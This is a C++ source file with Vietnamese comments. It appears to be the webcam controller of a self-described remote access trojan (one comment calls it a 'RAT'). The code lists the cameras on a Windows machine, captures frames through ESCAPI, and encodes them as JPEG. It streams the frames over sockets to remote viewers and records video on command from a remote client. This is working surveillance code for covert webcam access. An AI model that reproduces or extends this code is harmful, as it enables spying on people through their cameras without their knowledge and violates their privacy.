// controllers/DeviceController.cpp (PHIEN BAN HYBRID)
#include "DeviceController.h"
#include "../utils/helpers.h"
#include "../utils/logging.h"
#include "../utils/escapi.h"
#include <sstream>
#include <tchar.h>
#include <stdio.h>
#include <stdexcept>
#include <thread>

using namespace std;

string DeviceController::G_DEVICE_LIST_JSON = "{\"video\":[],\"audio\":[]}";
std::mutex DeviceController::G_DEVICE_LIST_MUTEX;
std::atomic<bool> DeviceController::G_IS_REFRESHING(false);

std::vector<SOCKET> DeviceController::viewingClients;
std::vector<RecordingSession *> DeviceController::recordingSessions;
std::mutex DeviceController::streamMutex;
std::atomic<bool> DeviceController::isStreaming(false);

// === 1. HAM LAY DANH SACH THIET BI (Dung ESCAPI luon) ===
void DeviceController::buildDeviceListJson()
{
    if (G_IS_REFRESHING.exchange(true))
        return;

    // Khoi tao ESCAPI
    if (setupESCAPI() == 0)
    {
        logConsole("SYSTEM", "Khong tim thay escapi.dll!");
        G_IS_REFRESHING.store(false);
        return;
    }

    int count = countCaptureDevices();
    stringstream json_ss;
    json_ss << "{\"video\":[";

    char name[256];
    for (int i = 0; i < count; i++)
    {
        getCaptureDeviceName(i, name, 256);
        json_ss << (i ? "," : "") << "\"" << jsonEscape(string(name)) << "\"";
    }

    // Audio tam thoi de trong hoac fake vi ESCAPI chi xu ly hinh anh
    json_ss << "],\"audio\":[\"Default Microphone\"]}";

    {
        std::lock_guard<std::mutex> lock(G_DEVICE_LIST_MUTEX);
        G_DEVICE_LIST_JSON = json_ss.str();
    }
    G_IS_REFRESHING.store(false);
}

string rawToJpeg(int *rawPixels, int w, int h)
{
    // Tao Bitmap tu buffer (ESCAPI tra ve BGRA, hop voi Windows Bitmap)
    Bitmap bmp(w, h, w * 4, PixelFormat32bppARGB, (BYTE *)rawPixels);

    // Get Encoder
    CLSID clsid;
    GetEncoderClsid(L"image/jpeg", &clsid); // Ham nay ban da co trong helpers.cpp

    // Set Quality (Giam xuong 40-50 cho nhe)
    ULONG quality = 50;
    EncoderParameters eps;
    eps.Count = 1;
    eps.Parameter[0].Guid = EncoderQuality;
    eps.Parameter[0].Type = EncoderParameterValueTypeLong;
    eps.Parameter[0].NumberOfValues = 1;
    eps.Parameter[0].Value = &quality;

    // Save to Stream
    IStream *pStream = NULL;
    CreateStreamOnHGlobal(NULL, TRUE, &pStream);
    bmp.Save(pStream, &clsid, &eps);

    // Read stream to string
    LARGE_INTEGER liZero = {};
    ULARGE_INTEGER pos = {};
    pStream->Seek(liZero, STREAM_SEEK_CUR, &pos);
    pStream->Seek(liZero, STREAM_SEEK_SET, NULL);

    string data;
    data.resize((size_t)pos.QuadPart);
    ULONG bytesRead = 0;
    pStream->Read(&data[0], (ULONG)pos.QuadPart, &bytesRead);
    pStream->Release();

    return data;
}

string DeviceController::getDevices(bool refresh)
{
    if (refresh)
    {
        if (G_IS_REFRESHING.load())
        {
            // Neu dang co 1 luong khac refresh, tra ve "busy"
            return "{\"video\":[],\"audio\":[], \"status\":\"refresh_busy\"}";
        }
        else
        {
            // Neu chua co, bat dau refresh trong luong MOI va tra ve "pending"
            logConsole("Gateway", "Yeu cau quet lai thiet bi (Async)...");
            std::thread(buildDeviceListJson).detach();
            return "{\"video\":[],\"audio\":[], \"status\":\"refresh_pending\"}";
        }
    }
    else
    {
        // === VA LOI 3: Dung Mutex de doc an toan ===
        std::lock_guard<std::mutex> lock(G_DEVICE_LIST_MUTEX);
        return G_DEVICE_LIST_JSON;
    }
}

void DeviceController::broadcastWorker(string camName, string audio)
{
    logConsole("BROADCAST", "Khoi dong ESCAPI Stream...");

    if (setupESCAPI() == 0)
    {
        logConsole("BROADCAST", "Loi: Thieu escapi.dll");
        isStreaming = false;
        return;
    }

    // Tim device index dua theo ten
    int devIndex = 0;
    int count = countCaptureDevices();
    char nameBuf[256];
    for (int i = 0; i < count; i++)
    {
        getCaptureDeviceName(i, nameBuf, 256);
        if (camName.find(nameBuf) != string::npos)
        {
            devIndex = i;
            break;
        }
    }

    // Cau hinh Capture
    SimpleCapParams capture;
    capture.mWidth = 320; // 320x240 la du cho RAT, rat nhe
    capture.mHeight = 240;
    capture.mTargetBuf = new int[capture.mWidth * capture.mHeight];

    initCapture(devIndex, &capture);

    while (isStreaming)
    {
        // A. Yeu cau chup
        doCapture(devIndex);

        // B. Doi chup xong
        while (isCaptureDone(devIndex) == 0)
        {
            if (!isStreaming)
                break;
            Sleep(10);
        }
        if (!isStreaming)
            break;

        // C. Convert Raw -> JPEG
        string jpgData = rawToJpeg(capture.mTargetBuf, capture.mWidth, capture.mHeight);

        // D. Gui cho danh sach Client (Broadcast logic cu)
        lock_guard<mutex> lock(viewersMutex); // Dung viewersMutex thay vi streamMutex neu ban da tach

        if (viewingClients.empty())
        { // Neu bo chuc nang record server-side
            isStreaming = false;
            break;
        }

        // Them Header do dai (Packet Framing) de Client JS hieu
        // Day la buoc quan trong: sendStreamFrame se gui 4 bytes do dai truoc
        for (auto it = viewingClients.begin(); it != viewingClients.end();)
        {
            if (!sendStreamFrame(*it, jpgData))
            { // Ham nay trong helpers.cpp
                closesocket(*it);
                it = viewingClients.erase(it);
            }
            else
            {
                ++it;
            }
        }

        // Sleep de giu FPS (vd 20FPS -> 50ms)
        Sleep(50);
    }

    deinitCapture(devIndex);
    delete[] capture.mTargetBuf;
    logConsole("BROADCAST", "Da dung Stream.");
}
// === HAM QUAY VIDEO (CHI DANG KY SESSION) ===
void DeviceController::recordVideoAsync(SOCKET client, string correlationId,
                                        string dur_str, string cam, string audio,
                                        std::mutex &socketMutex)
{
    lock_guard<mutex> lock(streamMutex);

    int duration = 5;
    try
    {
        duration = stoi(dur_str);
    }
    catch (...)
    {
    }

    time_t now = time(0);
    char fname_buf[100];
    strftime(fname_buf, sizeof(fname_buf), "vid_%Y%m%d_%H%M%S", localtime(&now));

    // Tao session moi
    RecordingSession *sess = new RecordingSession();
    sess->client = client;
    sess->correlationId = correlationId;
    sess->socketMutex = &socketMutex;
    sess->endTime = now + duration + 1;

    // Ten file: session nay se co hau to rieng de khong trung nhau neu 2 client cung quay
    // Them ID ngau nhien vao ten file
    string randId = to_string(rand() % 1000);

    // File tam (chua raw mjpeg data)
    sess->tempFilename = "../public/" + string(fname_buf) + "_" + randId + ".mjpeg";
    // File cuoi (mp4) - Day la path ma Server.exe nhin thay (tu thu muc core)
    sess->finalPath = "../public/" + string(fname_buf) + "_" + randId + ".mp4";

    sess->fileStream.open(sess->tempFilename, ios::binary);

    if (!sess->fileStream.is_open())
    {
        sendCmdTcp(client, correlationId, "JSON {\"ok\":false,\"error\":\"Cannot create file\"}", socketMutex);
        delete sess;
        return;
    }

    recordingSessions.push_back(sess);
    logConsole("REC", "Da dang ky quay " + dur_str + "s. File: " + sess->tempFilename);

    // Neu stream chua chay thi bat no len
    if (!isStreaming)
    {
        isStreaming = true;
        std::thread(broadcastWorker, cam, audio).detach();
    }
}

// === HAM LIVE STREAM (GIU KET NOI) ===
void DeviceController::handleStreamCam(SOCKET client, const string &clientIP, const string &cam, const string &audio)
{
    {
        lock_guard<mutex> lock(streamMutex);
        viewingClients.push_back(client);
        if (!isStreaming)
        {
            isStreaming = true;
            std::thread(broadcastWorker, cam, audio).detach();
        }
    }

    char dummy[10];
    while (true)
    {
        if (recv(client, dummy, sizeof(dummy), 0) <= 0)
            break;
    }
}